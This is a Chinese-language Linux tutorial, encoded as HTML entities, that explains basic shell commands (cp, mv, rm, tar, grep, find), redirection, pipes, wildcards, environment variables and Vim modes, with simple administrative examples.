&#x9664;&#x4E86;&#x80FD;&#x521B;&#x5EFA;&#x5355;&#x4E2A;&#x7A7A;&#x767D;&#x76EE;&#x5F55;&#x5916;&#xFF0C;mkdir&#x547D;&#x4EE4;&#x8FD8;&#x53EF;&#x4EE5;&#x7ED3;&#x5408;-p &#x53C2;&#x6570;&#x6765;&#x9012;&#x5F52;&#x521B;&#x5EFA;&#x51FA;&#x5177;&#x6709;&#x5D4C;&#x5957;&#x53E0;&#x5C42;&#x5173;&#x7CFB;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x3002; mkdir -p a/b/c/d/e 3, cp &#x547D;&#x4EE4; cp &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x590D;&#x5236;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;cp [&#x9009;&#x9879;] &#x6E90;&#x6587;&#x4EF6; &#x76EE;&#x6807;&#x6587;&#x4EF6;&#x201D;&#x3002; 12345-p &#x4FDD;&#x7559;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x6027;-d &#x82E5;&#x5BF9;&#x8C61;&#x4E3A;&#x201C;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x201D;&#xFF0C;&#x5219;&#x4FDD;&#x7559;&#x8BE5;&#x201C;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x201D;&#x7684;&#x5C5E;&#x6027;-r &#x9012;&#x5F52;&#x6301;&#x7EED;&#x590D;&#x5236;&#xFF08;&#x7528;&#x4E8E;&#x76EE;&#x5F55;&#xFF09;-i &#x82E5;&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x5B58;&#x5728;&#x5219;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x8986;&#x76D6;-a &#x76F8;&#x5F53;&#x4E8E;-pdr&#xFF08;p&#x3001;d&#x3001;r &#x4E3A;&#x4E0A;&#x8FF0;&#x53C2;&#x6570;&#xFF09; &#x4F7F;&#x7528; touch &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; install.log &#x7684;&#x666E;&#x901A;&#x7A7A;&#x767D;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x5176;&#x590D;&#x5236;&#x4E3A;&#x4E00;&#x4EFD;&#x540D;&#x4E3A;x.log &#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x3002; cp install.log x.log 4, mv &#x547D;&#x4EE4; mv &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x526A;&#x5207;&#x6587;&#x4EF6;&#x6216;&#x5C06;&#x6587;&#x4EF6;&#x91CD;&#x547D;&#x540D;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;mv [&#x9009;&#x9879;] &#x6E90;&#x6587;&#x4EF6; [&#x76EE;&#x6807;&#x8DEF;&#x5F84;|&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x540D;]&#x201D;&#x3002; 5, rm &#x547D;&#x4EE4; rm &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;rm [&#x9009;&#x9879;] &#x6587;&#x4EF6;&#x201D;&#x3002; &#x5728; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x5411;&#x60A8;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x8981;&#x6267;&#x884C;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x603B;&#x662F;&#x770B;&#x5230;&#x8FD9;&#x79CD;&#x53CD;&#x590D;&#x7684;&#x786E;&#x8BA4;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x5728; rm &#x547D;&#x4EE4;&#x540E;&#x8DDF;&#x4E0A;-f &#x53C2;&#x6570;&#x6765;&#x5F3A;&#x5236;&#x5220;&#x9664;&#x3002; rm -f linux.log 6, dd &#x547D;&#x4EE4; dd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x548C;&#x4E2A;&#x6570;&#x7684;&#x6570;&#x636E;&#x5757;&#x6765;&#x590D;&#x5236;&#x6587;&#x4EF6;&#x6216;&#x8F6C;&#x6362;&#x6587;&#x4EF6;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;dd [&#x53C2;&#x6570;]&#x201D;&#x3002; 7 file &#x547D;&#x4EE4; file &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;file &#x6587;&#x4EF6;&#x540D;&#x201D;&#x3002; &#x6253;&#x5305;&#x538B;&#x7F29;&#x4E0E;&#x641C;&#x7D22;&#x547D;&#x4EE4; 1, tar &#x547D;&#x4EE4; tar &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6253;&#x5305;&#x538B;&#x7F29;&#x6216;&#x89E3;&#x538B;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;tar [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; 12345678910-c &#x521B;&#x5EFA;&#x538B;&#x7F29;&#x6587;&#x4EF6;-x &#x89E3;&#x5F00;&#x538B;&#x7F29;&#x6587;&#x4EF6;-t &#x67E5;&#x770B;&#x538B;&#x7F29;&#x5305;&#x5185;&#x6709;&#x54EA;&#x4E9B;&#x6587;&#x4EF6;-z &#x7528; Gzip &#x538B;&#x7F29;&#x6216;&#x89E3;&#x538B;-j &#x7528; bzip2 &#x538B;&#x7F29;&#x6216;&#x89E3;&#x538B;-v &#x663E;&#x793A;&#x538B;&#x7F29;&#x6216;&#x89E3;&#x538B;&#x7684;&#x8FC7;&#x7A0B;-f &#x76EE;&#x6807;&#x6587;&#x4EF6;&#x540D;-p &#x4FDD;&#x7559;&#x539F;&#x59CB;&#x7684;&#x6743;&#x9650;&#x4E0E;&#x5C5E;&#x6027;-P &#x4F7F;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#x6765;&#x538B;&#x7F29;-C &#x6307;&#x5B9A;&#x89E3;&#x538B;&#x5230;&#x7684;&#x76EE;&#x5F55; 1234tar -czvf &#x538B;&#x7F29;&#x5305;&#x540D;&#x79F0;.tar.gz &#x8981;&#x6253;&#x5305;&#x7684;&#x76EE;&#x5F55;tar -xzvf &#x538B;&#x7F29;&#x5305;&#x540D;&#x79F0;.tar.gz &#x8981;&#x89E3;&#x538B;&#x7684;&#x76EE;&#x5F55;tar -czvf etc.tar.gz /etctar xzvf etc.tar.gz -C /root/etc -C &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x8981;&#x89E3;&#x538B;&#x5230;&#x54EA;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x3002;-f &#x53C2;&#x6570;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x5B83;&#x5FC5;&#x987B;&#x653E;&#x5230;&#x53C2;&#x6570;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#xFF0C;&#x4EE3;&#x8868;&#x8981;&#x538B;&#x7F29;&#x6216;&#x89E3;&#x538B;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0;&#x3002; 2, grep &#x547D;&#x4EE4; grep &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5728;&#x6587;&#x672C;&#x4E2D;&#x6267;&#x884C;&#x5173;&#x952E;&#x8BCD;&#x641C;&#x7D22;&#xFF0C;&#x5E76;&#x663E;&#x793A;&#x5339;&#x914D;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;grep [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; 12345-b &#x5C06;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF08;binary&#xFF09;&#x5F53;&#x4F5C;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF08;text&#xFF09;&#x6765;&#x641C;&#x7D22;-c &#x4EC5;&#x663E;&#x793A;&#x627E;&#x5230;&#x7684;&#x884C;&#x6570;-i &#x5FFD;&#x7565;&#x5927;&#x5C0F;&#x5199;-n &#x663E;&#x793A;&#x884C;&#x53F7;-v &#x53CD;&#x5411;&#x9009;&#x62E9;&#x2014;&#x4EC5;&#x5217;&#x51FA;&#x6CA1;&#x6709;&#x201C;&#x5173;&#x952E;&#x8BCD;&#x201D;&#x7684;&#x884C; -n &#x53C2;&#x6570;&#x7528;&#x6765;&#x663E;&#x793A;&#x641C;&#x7D22;&#x5230;&#x4FE1;&#x606F;&#x7684;&#x884C;&#x53F7;&#xFF1B;-v &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x53CD;&#x9009;&#x4FE1;&#x606F;&#xFF08;&#x5373;&#x6CA1;&#x6709;&#x5305;&#x542B;&#x5173;&#x952E;&#x8BCD;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#x884C;&#xFF09;&#x3002; &#x4F7F;&#x7528; grep &#x547D;&#x4EE4;&#x6765;&#x67E5;&#x627E;&#x51FA;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E0D;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x7684;&#x6240;&#x6709;&#x7528;&#x6237;&#x4FE1;&#x606F;: grep /sbin/nologin /etc/passwd 3, find &#x547D;&#x4EE4; find &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x6761;&#x4EF6;&#x6765;&#x67E5;&#x627E;&#x6587;&#x4EF6;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;find [&#x67E5;&#x627E;&#x8DEF;&#x5F84;] &#x5BFB;&#x627E;&#x6761;&#x4EF6; &#x64CD;&#x4F5C;&#x201D;&#x3002; 12345678910111213141516171819-name &#x5339;&#x914D;&#x540D;&#x79F0;-perm &#x5339;&#x914D;&#x6743;&#x9650;&#xFF08;mode &#x4E3A;&#x5B8C;&#x5168;&#x5339;&#x914D;&#xFF0C;-mode &#x4E3A;&#x5305;&#x542B;&#x5373;&#x53EF;&#xFF09;-user &#x5339;&#x914D;&#x6240;&#x6709;&#x8005;-group &#x5339;&#x914D;&#x6240;&#x6709;&#x7EC4;-mtime -n +n &#x5339;&#x914D;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#x7684;&#x65F6;&#x95F4;&#xFF08;-n &#x6307; n &#x5929;&#x4EE5;&#x5185;&#xFF0C;+n &#x6307; n &#x5929;&#x4EE5;&#x524D;&#xFF09;-atime -n +n &#x5339;&#x914D;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#xFF08;-n &#x6307; n &#x5929;&#x4EE5;&#x5185;&#xFF0C;+n &#x6307; n &#x5929;&#x4EE5;&#x524D;&#xFF09;-ctime -n +n &#x5339;&#x914D;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6743;&#x9650;&#x7684;&#x65F6;&#x95F4;&#xFF08;-n &#x6307; n &#x5929;&#x4EE5;&#x5185;&#xFF0C;+n &#x6307; n &#x5929;&#x4EE5;&#x524D;&#xFF09;-nouser &#x5339;&#x914D;&#x65E0;&#x6240;&#x6709;&#x8005;&#x7684;&#x6587;&#x4EF6;-nogroup &#x5339;&#x914D;&#x65E0;&#x6240;&#x6709;&#x7EC4;&#x7684;&#x6587;&#x4EF6;-newer f1 !f2 &#x5339;&#x914D;&#x6BD4;&#x6587;&#x4EF6; f1 &#x65B0;&#x4F46;&#x6BD4; f2 &#x65E7;&#x7684;&#x6587;&#x4EF6;--typeb/d/c/p/l/f&#x5339;&#x914D;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#xFF08;&#x540E;&#x9762;&#x7684;&#x5B57;&#x6BCD;&#x53C2;&#x6570;&#x4F9D;&#x6B21;&#x8868;&#x793A;&#x5757;&#x8BBE;&#x5907;&#x3001;&#x76EE;&#x5F55;&#x3001;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x3001;&#x7BA1;&#x9053;&#x3001;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x3001;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF09;-size&#x5339;&#x914D;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#xFF08;+50KB &#x4E3A;&#x67E5;&#x627E;&#x8D85;&#x8FC7; 50KB &#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;-50KB &#x4E3A;&#x67E5;&#x627E;&#x5C0F;&#x4E8E; 50KB &#x7684;&#x6587;&#x4EF6;&#xFF09;-prune &#x5FFD;&#x7565;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;-exec &#x2026;&#x2026; {}\\; &#x540E;&#x9762;&#x53EF;&#x8DDF;&#x7528;&#x4E8E;&#x8FDB;&#x4E00;&#x6B65;&#x5904;&#x7406;&#x641C;&#x7D22;&#x7ED3;&#x679C;&#x7684;&#x547D;&#x4EE4;&#xFF08;&#x4E0B;&#x6587;&#x4F1A;&#x6709;&#x6F14;&#x793A;&#xFF09; Linux &#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F1A;&#x4FDD;&#x5B58;&#x5230;/etc &#x76EE;&#x5F55;&#x4E2D;&#xFF08;&#x8BE6;&#x89C1;&#x7B2C; 6 &#x7AE0;&#xFF09;&#x3002;&#x5982;&#x679C;&#x8981;&#x60F3;&#x83B7;&#x53D6;&#x5230;&#x8BE5;&#x76EE;&#x5F55;&#x4E2D;&#x6240;&#x6709;&#x4EE5; host &#x5F00;&#x5934;&#x7684;&#x6587;&#x4EF6;&#x5217;&#x8868;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#xFF1A; find /etc -name &quot;host*&quot; -print &#x7B2C;&#x4E09;&#x7AE0;,&#x7BA1;&#x9053;&#x7B26;&#x3001;&#x91CD;&#x5B9A;&#x5411;&#x4E0E;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#x662F;&#x6307;&#x628A;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5230;&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x800C;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5219;&#x662F;&#x6307;&#x628A;&#x539F;&#x672C;&#x8981;&#x8F93;&#x51FA;&#x5230;&#x5C4F;&#x5E55;&#x7684;&#x6570;&#x636E;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x4E2D;&#x3002; 123&#x6807;&#x51C6;&#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#xFF08;STDIN&#xFF0C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E3A; 0&#xFF09;&#xFF1A;&#x9ED8;&#x8BA4;&#x4ECE;&#x952E;&#x76D8;&#x8F93;&#x5165;&#xFF0C;&#x4E5F;&#x53EF;&#x4ECE;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x6216;&#x547D;&#x4EE4;&#x4E2D;&#x8F93;&#x5165;&#x3002;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#xFF08;STDOUT&#xFF0C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E3A; 1&#xFF09;&#xFF1A;&#x9ED8;&#x8BA4;&#x8F93;&#x51FA;&#x5230;&#x5C4F;&#x5E55;&#x3002;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#xFF08;STDERR&#xFF0C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E3A; 2&#xFF09;&#xFF1A;&#x9ED8;&#x8BA4;&#x8F93;&#x51FA;&#x5230;&#x5C4F;&#x5E55;&#x3002; &#x8F93;&#x5165;&#x91CD;&#x5B9A;&#x5411;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x7B26;&#x53F7;&#x53CA;&#x5176;&#x4F5C;&#x7528;: 123&#x547D;&#x4EE4; &lt; &#x6587;&#x4EF6; &#x5C06;&#x6587;&#x4EF6;&#x4F5C;&#x4E3A;&#x547D;&#x4EE4;&#x7684;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x547D;&#x4EE4; &lt;&lt; &#x5206;&#x754C;&#x7B26; &#x4ECE;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x4E2D;&#x8BFB;&#x5165;&#xFF0C;&#x76F4;&#x5230;&#x9047;&#x89C1;&#x5206;&#x754C;&#x7B26;&#x624D;&#x505C;&#x6B62;&#x547D;&#x4EE4; &lt; &#x6587;&#x4EF6; 1 &gt; &#x6587;&#x4EF6; 2 &#x5C06;&#x6587;&#x4EF6; 1 &#x4F5C;&#x4E3A;&#x547D;&#x4EE4;&#x7684;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x5E76;&#x5C06;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x5230;&#x6587;&#x4EF6; 2 &#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x7B26;&#x53F7;&#x53CA;&#x5176;&#x4F5C;&#x7528;: 1234567&#x547D;&#x4EE4; &gt; &#x6587;&#x4EF6; &#x5C06;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x6E05;&#x7A7A;&#x539F;&#x6709;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#xFF09;&#x547D;&#x4EE4; 2&gt; &#x6587;&#x4EF6; &#x5C06;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x6E05;&#x7A7A;&#x539F;&#x6709;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#xFF09;&#x547D;&#x4EE4; &gt;&gt; &#x6587;&#x4EF6; &#x5C06;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x8FFD;&#x52A0;&#x5230;&#x539F;&#x6709;&#x5185;&#x5BB9;&#x7684;&#x540E;&#x9762;&#xFF09;&#x547D;&#x4EE4; 2&gt;&gt; &#x6587;&#x4EF6; &#x5C06;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x8FFD;&#x52A0;&#x5230;&#x539F;&#x6709;&#x5185;&#x5BB9;&#x7684;&#x540E;&#x9762;&#xFF09;&#x547D;&#x4EE4; &gt;&gt; &#x6587;&#x4EF6; 2&gt;&amp;1&#x6216;&#x547D;&#x4EE4; &amp;&gt;&gt; &#x6587;&#x4EF6; &#x5C06;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x4E0E;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x5171;&#x540C;&#x5199;&#x5165;&#x5230;&#x6587;&#x4EF6;&#x4E2D;&#xFF08;&#x8FFD;&#x52A0;&#x5230;&#x539F;&#x6709;&#x5185;&#x5BB9;&#x7684;&#x540E;&#x9762;&#xFF09; &#x7BA1;&#x9053;&#x547D;&#x4EE4;&#x7B26;12&#x627E;&#x51FA;&#x88AB;&#x9650;&#x5236;&#x767B;&#x5F55;&#x7528;&#x6237;&#x7684;&#x547D;&#x4EE4;&#x662F; grep &quot;/sbin/nologin&quot; /etc/passwd&#xFF1B;&#x7EDF;&#x8BA1;&#x6587;&#x672C;&#x884C;&#x6570;&#x7684;&#x547D;&#x4EE4;&#x5219;&#x662F; wc -l&#x3002; &#x7528;&#x7FFB;&#x9875;&#x7684;&#x5F62;&#x5F0F;&#x67E5;&#x770B;/etc &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x5217;&#x8868;&#x53CA;&#x5C5E;&#x6027;&#x4FE1;&#x606F; ls -l /etc/ | more &#x547D;&#x4EE4;&#x884C;&#x7684;&#x901A;&#x914D;&#x7B26;1234567891011121314&#x901A;&#x914D;&#x7B26;&#x5C31;&#x662F;&#x901A;&#x7528;&#x7684;&#x5339;&#x914D;&#x4FE1;&#x606F;&#x7684;&#x7B26;&#x53F7;&#xFF0C;&#x6BD4;&#x5982;&#x661F;&#x53F7;&#xFF08;*&#xFF09;&#x4EE3;&#x8868;&#x5339;&#x914D;&#x96F6;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x95EE;&#x53F7;&#xFF08;?&#xFF09;&#x4EE3;&#x8868;&#x5339;&#x914D;&#x5355;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4E2D;&#x62EC;&#x53F7;&#x5185;&#x52A0;&#x4E0A;&#x6570;&#x5B57;[0-9]&#x4EE3;&#x8868;&#x5339;&#x914D; 0&#xFF5E;9 &#x4E4B;&#x95F4;&#x7684;&#x5355;&#x4E2A;&#x6570;&#x5B57;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x4E2D;&#x62EC;&#x53F7;&#x5185;&#x52A0;&#x4E0A;&#x5B57;&#x6BCD;[abc]&#x5219;&#x662F;&#x4EE3;&#x8868;&#x5339;&#x914D; a&#x3001;b&#x3001;c &#x4E09;&#x4E2A;&#x5B57;&#x7B26;&#x4E2D;&#x7684;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x3002;&#x5339;&#x914D;&#x6240;&#x6709;&#x5728;/dev &#x76EE;&#x5F55;&#x4E2D;&#x4E14;&#x4EE5; sda &#x5F00;&#x5934;&#x7684;&#x6587;&#x4EF6;&#xFF1A;ls -l /dev/sda*&#x53EA;&#x60F3;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x540D;&#x4E3A; sda &#x5F00;&#x5934;&#xFF0C;&#x4F46;&#x662F;&#x540E;&#x9762;&#x8FD8;&#x7D27;&#x8DDF;&#x5176;&#x4ED6;&#x67D0;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;.ls -l /dev/sda?&#x9664;&#x4E86;&#x4F7F;&#x7528;[0-9]&#x6765;&#x5339;&#x914D; 0~9 &#x4E4B;&#x95F4;&#x7684;&#x5355;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;[135]&#x8FD9;&#x6837;&#x7684;&#x65B9;&#x5F0F;&#x4EC5;&#x5339;&#x914D;&#x8FD9;&#x4E09;&#x4E2A;&#x6307;&#x5B9A;&#x6570;&#x5B57;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#xFF0C;&#x82E5;&#x6CA1;&#x6709;&#x5339;&#x914D;&#x5230;&#xFF0C;&#x5219;&#x4E0D;&#x4F1A;&#x663E;&#x793A;&#x51FA;&#x6765;.ls -l /dev/sda[0-9] &#x5E38;&#x7528;&#x7684;&#x8F6C;&#x4E49;&#x5B57;&#x7B26;4 &#x4E2A;&#x6700;&#x5E38;&#x7528;&#x7684;&#x8F6C;&#x4E49;&#x5B57;&#x7B26;&#xFF1A; 1234&#x53CD;&#x659C;&#x6760;&#xFF08;\\&#xFF09;&#xFF1A;&#x4F7F;&#x53CD;&#x659C;&#x6760;&#x540E;&#x9762;&#x7684;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x53D8;&#x4E3A;&#x5355;&#x7EAF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x5355;&#x5F15;&#x53F7;&#xFF08;&apos;&apos;&#xFF09;&#xFF1A;&#x8F6C;&#x4E49;&#x5176;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x53D8;&#x91CF;&#x4E3A;&#x5355;&#x7EAF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53CC;&#x5F15;&#x53F7;&#xFF08;&quot;&quot;&#xFF09;&#xFF1A;&#x4FDD;&#x7559;&#x5176;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#x5C5E;&#x6027;&#xFF0C;&#x4E0D;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x5904;&#x7406;&#x3002;&#x53CD;&#x5F15;&#x53F7;&#xFF08;``&#xFF09;&#xFF1A;&#x628A;&#x5176;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x540E;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x3002; &#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; PRICE &#x7684;&#x53D8;&#x91CF;&#x5E76;&#x8D4B;&#x503C;&#x4E3A; 5&#xFF0C;&#x7136;&#x540E;&#x8F93;&#x51FA;&#x4EE5;&#x53CC;&#x5F15;&#x53F7;&#x62EC;&#x8D77;&#x6765;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E0E;&#x53D8;&#x91CF;&#x4FE1;&#x606F;&#xFF1A; 12THREE=3echo &quot;I&apos;m $THREE&quot; &#x91CD;&#x8981;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;12345678910HOME &#x7528;&#x6237;&#x7684;&#x4E3B;&#x76EE;&#x5F55;&#xFF08;&#x5373;&#x5BB6;&#x76EE;&#x5F55;&#xFF09;SHELL &#x7528;&#x6237;&#x5728;&#x4F7F;&#x7528;&#x7684; Shell &#x89E3;&#x91CA;&#x5668;&#x540D;&#x79F0;HISTSIZE &#x8F93;&#x51FA;&#x7684;&#x5386;&#x53F2;&#x547D;&#x4EE4;&#x8BB0;&#x5F55;&#x6761;&#x6570;HISTFILESIZE &#x4FDD;&#x5B58;&#x7684;&#x5386;&#x53F2;&#x547D;&#x4EE4;&#x8BB0;&#x5F55;&#x6761;&#x6570;MAIL &#x90AE;&#x4EF6;&#x4FDD;&#x5B58;&#x8DEF;&#x5F84;LANG &#x7CFB;&#x7EDF;&#x8BED;&#x8A00;&#x3001;&#x8BED;&#x7CFB;&#x540D;&#x79F0;RANDOM &#x751F;&#x6210;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x6570;&#x5B57;PS1 Bash &#x89E3;&#x91CA;&#x5668;&#x7684;&#x63D0;&#x793A;&#x7B26;PATH &#x5B9A;&#x4E49;&#x89E3;&#x91CA;&#x5668;&#x641C;&#x7D22;&#x7528;&#x6237;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x8DEF;&#x5F84;EDITOR &#x7528;&#x6237;&#x9ED8;&#x8BA4;&#x7684;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668; &#x4EE5;&#x4F7F;&#x7528; export &#x547D;&#x4EE4;&#x5C06;&#x5176;&#x63D0;&#x5347;&#x4E3A;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x8FD9;&#x6837;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x4E5F;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5B83;&#x4E86; export WORKDIR &#x7B2C;&#x56DB;&#x7AE0;,Vim&#x7F16;&#x8F91;&#x5668;&#x4E0E;Shell&#x547D;&#x4EE4;&#x811A;&#x672C;Vim&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;12345678&#x547D;&#x4EE4;&#x6A21;&#x5F0F;&#xFF1A;&#x63A7;&#x5236;&#x5149;&#x6807;&#x79FB;&#x52A8;&#xFF0C;&#x53EF;&#x5BF9;&#x6587;&#x672C;&#x8FDB;&#x884C;&#x590D;&#x5236;&#x3001;&#x7C98;&#x8D34;&#x3001;&#x5220;&#x9664;&#x548C;&#x67E5;&#x627E;&#x7B49;&#x5DE5;&#x4F5C;&#x3002;&#x8F93;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x6B63;&#x5E38;&#x7684;&#x6587;&#x672C;&#x5F55;&#x5165;&#x3002;&#x672B;&#x884C;&#x6A21;&#x5F0F;&#xFF1A;&#x4FDD;&#x5B58;&#x6216;&#x9000;&#x51FA;&#x6587;&#x6863;&#xFF0C;&#x4EE5;&#x53CA;&#x8BBE;&#x7F6E;&#x7F16;&#x8F91;&#x73AF;&#x5883;&#x3002;&#x547D;&#x4EE4;&#x6A21;&#x5F0F;&#xFF1A; a,i,o&#x7B49;&#x952E;&#xFF1A;&#x8F93;&#x5165;&#x6A21;&#x5F0F; &#xFF1A;&#x952E; &#x672B;&#x884C;&#x6A21;&#x5F0F; 